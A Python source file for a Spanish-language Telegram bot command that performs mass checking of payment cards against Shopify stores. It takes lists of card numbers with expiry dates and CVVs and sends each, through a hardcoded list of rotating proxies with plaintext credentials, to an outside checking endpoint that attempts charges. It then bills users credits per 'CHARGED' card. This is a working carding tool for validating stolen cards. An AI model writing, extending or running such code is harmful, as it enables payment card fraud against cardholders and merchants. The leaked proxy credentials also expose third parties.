# commands/shop/mass_sh_check.py
import sys
import os
import random
import time
import requests
import json
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.database import get_credits, set_credits, get_plan, is_premium, load_data, save_data
from utils.bin_database import get_bin_info

# LISTA DE PROXYS ALEATORIOS
PROXY_LIST = [
    "p.webshare.io:80:uiwaxqol-rotate:ky0ncy8jz6lo",
    "p.webshare.io:80:lhymcqfk-rotate:c40t0wn62pga", 
    "p.webshare.io:80:nioiisow-rotate:izgswpak25dh",
    "zxo.run.place:6969:dunsito:dunsito"
]

def setup_mass_sh_check_command(bot):
    @bot.message_handler(commands=['msh'])
    def mass_sh_check_command(message):
        print(f"🔹 [MSH] Comando /msh recibido de {message.from_user.first_name} (ID: {message.from_user.id})")
        process_mass_sh_check(bot, message)

def process_mass_sh_check(bot, message):
    """Maneja el mass check con /msh - Solo para usuarios premium"""
    user_id = message.from_user.id
    username = message.from_user.first_name
    
    print(f"🔹 [MSH] Comando /msh recibido de {username} (ID: {user_id})")
    
    # Verificar si es Premium User
    if not is_premium(user_id):
        print(f"🔹 [MSH] Usuario {username} NO es premium - Rechazando comando")
        bot.reply_to(message, "❌ Comando solo para usuarios premium.\n@Dunxito para adquirir tu plan.")
        return
    
    # Verificar créditos
    credits = get_credits(user_id)
    print(f"🔹 [MSH] Usuario {username} - Créditos disponibles: {credits}")
    
    if credits <= 0:
        print(f"🔹 [MSH] Usuario {username} - Créditos insuficientes")
        bot.reply_to(message, "❌ Créditos insuficientes.")
        return
    
    try:
        # Obtener el texto después del comando
        if message.text.startswith('/msh'):
            command_text = message.text[5:]
        else:
            command_text = message.text.strip()
            
        print(f"🔹 [MSH] Texto del comando de {username}: '{command_text}'")
        
        if not command_text:
            print(f"🔹 [MSH] Usuario {username} - Comando sin parámetros")
            bot.reply_to(message, "⚠️ Uso: `/msh <lista_de_tarjetas>`\nEjemplo: `/msh 4282104033002891|11|29|500 5104886655308541|09|29|094`\n\n📊 **Límites:**\n• Mínimo: 2 tarjetas\n• Máximo: 25 tarjetas\n• **Recomendado:** No más de 5 para evitar sobrecarga de proxies\n\n💳 **Costos:**\n• CHARGED: 2 créditos\n• 3D CC: 1 crédito\n• Otros DECLINED: 0 créditos", parse_mode="Markdown")
            return
        
        # Dividir las tarjetas (separadas por espacios)
        cards = command_text.split()
        print(f"🔹 [MSH] Usuario {username} - Tarjetas encontradas: {len(cards)}")
        
        # Validar mínimo 2 tarjetas
        if len(cards) < 2:
            print(f"🔹 [MSH] Usuario {username} - Mínimo de tarjetas no alcanzado")
            bot.reply_to(message, "❌ Se necesitan 2 tarjetas como mínimo.", parse_mode="Markdown")
            return
        
        # Limitar a 25 tarjetas máximo
        if len(cards) > 25:
            original_count = len(cards)
            cards = cards[:25]
            print(f"🔹 [MSH] Usuario {username} - Limité de {original_count} a 25 tarjetas")
            bot.reply_to(message, f"⚠️ Se procesarán solo las primeras 25 tarjetas de las {original_count} enviadas")
        
        # Advertencia si son más de 5 tarjetas
        if len(cards) > 5:
            print(f"🔹 [MSH] Usuario {username} - Advertencia: {len(cards)} tarjetas (más de 5)")
            bot.reply_to(message, f"Enviar mas de 8 tarjetas puede hacer el proceso mas lento\n🔄 Procesando...")
        
        # Obtener sitios del usuario
        user_sites = get_user_sites(user_id)
        if not user_sites:
            print(f"🔹 [MSH] Usuario {username} - No tiene sitios configurados")
            bot.reply_to(message, "❌ No tienes sitios configurados.\nUsa `/site tupagina.com` para agregar sitios primero.")
            return
        
        print(f"🔹 [MSH] Usuario {username} - Sitios disponibles: {len(user_sites)}")
        
        # Calcular créditos máximos que podría gastar (2 créditos por CHARGED)
        max_possible_cost = len(cards) * 2
        print(f"🔹 [MSH] Usuario {username} - Costo máximo posible: {max_possible_cost} créditos")
        
        # Verificar si tiene créditos suficientes para el peor caso
        if credits < max_possible_cost:
            print(f"🔹 [MSH] Usuario {username} - Créditos insuficientes para máximo costo")
            bot.reply_to(message, f"❌ Créditos insuficientes. Necesitas al menos {max_possible_cost} créditos para procesar {len(cards)} tarjetas (máximo 2 créditos por CHARGED)")
            return
        
        # Enviar mensaje de procesamiento
        print(f"🔹 [MSH] Usuario {username} - Iniciando procesamiento de {len(cards)} tarjetas")
        processing_msg = bot.reply_to(message, f"🔄 Procesando {len(cards)} tarjetas en {len(user_sites)} sitios...\n⏳ Esto puede tomar unos segundos...\n💳 Créditos disponibles: {credits}\n💡 **Nota:** Usar muchas tarjetas puede ralentizar el proceso")
        
        # Procesar todas las tarjetas
        start_time = time.time()
        results = []
        charged_cards = 0
        three_d_cc_cards = 0
        total_cost = 0
        
        print(f"🔹 [MSH] Usuario {username} - Iniciando loop de procesamiento...")
        
        for i, card_data in enumerate(cards, 1):
            try:
                print(f"🔹 [MSH] Usuario {username} - Procesando tarjeta {i}/{len(cards)}: {card_data[:10]}...")
                
                # ESCOGER UN SITIO ALEATORIO PARA CADA TARJETA
                random_site = random.choice(user_sites)
                print(f"🔹 [MSH] Usuario {username} - Tarjeta {i} usando sitio: {random_site}")
                
                # Procesar cada tarjeta individualmente
                result, cost = process_single_sh_card(card_data, i, random_site)
                results.append(result)
                
                # Contar tarjetas y calcular costo
                if cost == 2:  # CHARGED
                    charged_cards += 1
                    total_cost += 2
                    print(f"🔹 [MSH] Usuario {username} - Tarjeta {i} CHARGED (+2 créditos)")
                elif cost == 1:  # 3D CC
                    three_d_cc_cards += 1
                    total_cost += 1
                    print(f"🔹 [MSH] Usuario {username} - Tarjeta {i} 3D CC (+1 crédito)")
                else:
                    print(f"🔹 [MSH] Usuario {username} - Tarjeta {i} DECLINED (0 créditos)")
                
                print(f"🔹 [MSH] Usuario {username} - Costo acumulado: {total_cost} créditos")
                
                # Actualizar mensaje de progreso cada 3 tarjetas (o menos si son muchas)
                update_interval = 3 if len(cards) <= 10 else 5
                if i % update_interval == 0 or i == len(cards):
                    progress_msg = f"🔄 Procesando {len(cards)} tarjetas...\n📊 Completado: {i}/{len(cards)}\n✅ Charged: {charged_cards} | 3D CC: {three_d_cc_cards}\n💳 Costo acumulado: {total_cost} créditos"
                    if len(cards) > 10:
                        progress_msg += f"\n🐢 Procesando {len(cards)} tarjetas (puede demorar)"
                    bot.edit_message_text(progress_msg, message.chat.id, processing_msg.message_id)
                    print(f"🔹 [MSH] Usuario {username} - Progreso actualizado: {i}/{len(cards)}")
                
                # Pequeña pausa para no sobrecargar los proxies
                if len(cards) > 5:
                    time.sleep(0.3)
                
            except Exception as e:
                error_msg = f"❌ Tarjeta {i}: Error - {str(e)}"
                results.append(error_msg)
                print(f"🔴 [MSH] ERROR Usuario {username} - Tarjeta {i}: {str(e)}")
        
        # Restar créditos según los resultados
        if total_cost > 0:
            new_credits = credits - total_cost
            set_credits(user_id, new_credits)
            print(f"🔹 [MSH] Usuario {username} - Créditos restados: {total_cost}. Nuevo saldo: {new_credits}")
        else:
            new_credits = credits
            print(f"🔹 [MSH] Usuario {username} - No se restaron créditos")
        
        end_time = time.time()
        total_time = round(end_time - start_time, 2)
        
        # Obtener plan del usuario actualizado
        plan = get_plan(user_id, new_credits)
        
        # Eliminar mensaje de procesamiento
        bot.delete_message(message.chat.id, processing_msg.message_id)
        
        # Formatear resultados
        results_text = "\n".join(results)
        
        # Crear respuesta final
        response_text = f"""
- - - - - - - - - - - - - - - - - - - - -
 Mass Shop Check
- - - - - - - - - - - - - - - - - - - - - 
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➙ Shopify
- - - - - - - - - - - - - - - - - - - - - 

{results_text}

- - - - - - - - - - - - - - - - - - - - -
🝮 Total : {len(cards)} tarjetas
🝮 Costo Total : {total_cost} créditos
🝮 Time : {total_time}s
🝮 Credits Left : {new_credits}
🝮 Checked by : {username} [{plan}]
"""
        
        # Añadir recomendación si usó muchas tarjetas
        if len(cards) > 5:
            response_text += f"\nRecomendacion: usen entre 5-7 tarjetas para no acabar el proxy."
        
        print(f"🔹 [MSH] Usuario {username} - Enviando respuesta final...")
        print(f"🔹 [MSH] RESUMEN Usuario {username}: {len(cards)} tarjetas, {charged_cards} CHARGED, {three_d_cc_cards} 3D CC, Costo: {total_cost}, Tiempo: {total_time}s")
        
        # Si el mensaje es muy largo, dividirlo en partes
        if len(response_text) > 4000:
            # Enviar primera parte
            first_part = response_text[:4000]
            bot.reply_to(message, first_part)
            
            # Enviar parte restante
            remaining_part = response_text[4000:]
            bot.reply_to(message, remaining_part)
        else:
            bot.reply_to(message, response_text)
        
        print(f"✅ [MSH] COMPLETADO Usuario {username} - Mass shop check exitoso")
        
    except Exception as e:
        print(f"🔴 [MSH] ERROR CRÍTICO Usuario {username}: {str(e)}")
        # Eliminar mensaje de procesamiento si existe
        try:
            bot.delete_message(message.chat.id, processing_msg.message_id)
        except:
            pass
        bot.reply_to(message, f"❌ Error en mass shop check: {str(e)}")

def process_single_sh_card(card_data, card_number, site):
    """Procesa una sola tarjeta y retorna el resultado formateado y el costo"""
    try:
        # Verificar formato de tarjeta
        if '|' not in card_data:
            return f"❌ Tarjeta {card_number}: Formato incorrecto", 0
        
        card_parts = card_data.split('|')
        if len(card_parts) != 4:
            return f"❌ Tarjeta {card_number}: Formato incorrecto", 0
        
        cc_number, expiry_month, expiry_year, cvv = card_parts
        
        # Validar datos
        if not (cc_number.isdigit() and len(cc_number) == 16):
            return f"❌ Tarjeta {card_number}: Número inválido", 0
            
        if not (expiry_month.isdigit() and 1 <= int(expiry_month) <= 12):
            return f"❌ Tarjeta {card_number}: Mes inválido", 0
            
        # Validar y formatear año
        if not expiry_year.isdigit():
            return f"❌ Tarjeta {card_number}: Año inválido", 0
            
        if len(expiry_year) == 1:
            formatted_year = "0" + expiry_year
        elif len(expiry_year) == 2:
            formatted_year = expiry_year
        elif len(expiry_year) == 4:
            formatted_year = expiry_year[2:]
        else:
            return f"❌ Tarjeta {card_number}: Año inválido", 0
            
        if not (cvv.isdigit() and len(cvv) in [3, 4]):
            return f"❌ Tarjeta {card_number}: CVV inválido", 0
        
        # Procesar el check en el sitio
        result = process_site_check(site, cc_number, expiry_month, formatted_year, cvv)
        
        # Determinar costo basado en el resultado
        status = result['status']
        cost = 0
        
        if status == 'CHARGED':
            cost = 2
        elif '3D CC' in result['message']:
            cost = 0
        # Para DECLINED y otros, costo = 0
        
        # Obtener información del BIN
        bin_info = get_bin_info(cc_number[:6])
        
        # Formatear resultado individual
        status_emoji = "✅" if status == 'CHARGED' else "❌" if status == 'DECLINED' else "⚠️"
        result_text = f"🝮 {card_number}. {cc_number}|{expiry_month}|{expiry_year}|{cvv} | {status} {status_emoji} | {result['message'][:20]}... | 💰{cost}"
        
        return result_text, cost
    
    except Exception as e:
        return f"❌ Tarjeta {card_number}: Error - {str(e)}", 0

# FUNCIONES AUXILIARES (las mismas que en sites_manager.py)

def get_user_sites(user_id):
    """Obtiene la lista de sitios del usuario"""
    data = load_data()
    user_id_str = str(user_id)
    
    if user_id_str in data and 'sites' in data[user_id_str]:
        return data[user_id_str]['sites']
    return []

def process_site_check(site, cc_number, expiry_month, expiry_year, cvv):
    """Procesa un check en un sitio específico"""
    try:
        # Seleccionar proxy aleatorio
        proxy = random.choice(PROXY_LIST)
        
        # Construir URL exacta
        check_url = f"http://154.46.30.158/sh.php?site={site}&cc={cc_number}|{expiry_month}|{expiry_year}|{cvv}&proxy={proxy}"
        
        # Hacer la solicitud
        response = make_simple_request(check_url)
        
        # Parsear la respuesta JSON
        result_data = parse_sh_response(response)
        
        return {
            'site': site,
            'gateway': result_data['gateway'],
            'amount': result_data['amount'],
            'status': result_data['status'],
            'message': result_data['message'],
            'proxy_ip': result_data['proxy_ip'],
            'success': True
        }
        
    except Exception as e:
        return {
            'site': site,
            'gateway': 'UNKNOWN',
            'amount': '0.0',
            'status': 'ERROR',
            'message': str(e),
            'proxy_ip': '0.0.0.0',
            'success': False
        }

def make_simple_request(url):
    try:
        response = requests.get(url, timeout=30)
        return response.text
    except Exception as e:
        return f"Request Error: {str(e)}"

def parse_sh_response(response):
    """Parsea la respuesta JSON del endpoint sh.php"""
    try:
        data = json.loads(response)
        
        # Mapear la respuesta al formato esperado
        gateway = data.get('Gateway', 'UNKNOWN')
        amount = data.get('Price', '0.0')
        proxy_ip = data.get('ProxyIP', '0.0.0.0')
        response_msg = data.get('Response', 'NO_RESPONSE')
        
        # Convertir todo a mayúsculas para consistencia
        response_upper = response_msg.upper()
        
        # DETERMINAR STATUS BASADO EN CASOS ESPECÍFICOS
        if '3D CC' in response_upper:
            status = 'DECLINED'
        elif 'THANK YOU' in response_upper:
            status = 'CHARGED'
        elif 'APPROVED' in response_upper or 'SUCCESS' in response_upper or 'LIVE' in response_upper:
            status = 'APPROVED'
        elif 'INCORRECTNUMBER' in response_upper:
            status = 'DECLINED'
            response_upper = 'INCORRECT_NUMBER'
        else:
            # CUALQUIER OTRO RESULTADO → DECLINED
            status = 'DECLINED'
        
        return {
            'gateway': gateway.upper(),
            'amount': f"{amount}$",
            'status': status,
            'message': response_upper,
            'proxy_ip': proxy_ip
        }
        
    except json.JSONDecodeError:
        return {
            'gateway': 'UNKNOWN',
            'amount': '0.0$',
            'status': 'DECLINED',
            'message': 'INVALID JSON RESPONSE',
            'proxy_ip': '0.0.0.0'
        }